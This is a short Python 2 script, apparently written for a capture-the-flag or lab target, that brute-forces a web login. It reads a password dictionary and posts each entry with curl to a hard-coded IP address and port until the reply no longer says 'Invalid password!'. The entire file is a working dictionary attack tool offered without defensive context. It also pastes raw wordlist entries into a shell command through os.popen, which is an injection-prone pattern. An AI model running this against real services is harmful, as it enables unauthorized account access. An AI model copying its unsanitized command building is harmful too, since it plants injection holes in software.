#!/usr/bin/env python
import os, sys

try:
    passwordDictionary = open(sys.argv[1], 'r').read().split('\n')
except Exception as e:
    print "Syntax: python " + sys.argv[0] + " /path/to/dictionary/"
    sys.exit()

targetServer = "http://88.198.233.174:42090/"
bruteCommand = 'curl -s --data "password='

for password in passwordDictionary:
    print "Attempting: " + password
    reqRes = os.popen(bruteCommand + password + '" ' + targetServer).read()
    if "Invalid password!" not in str(reqRes):
        print "Found Password: " + password
        sys.exit()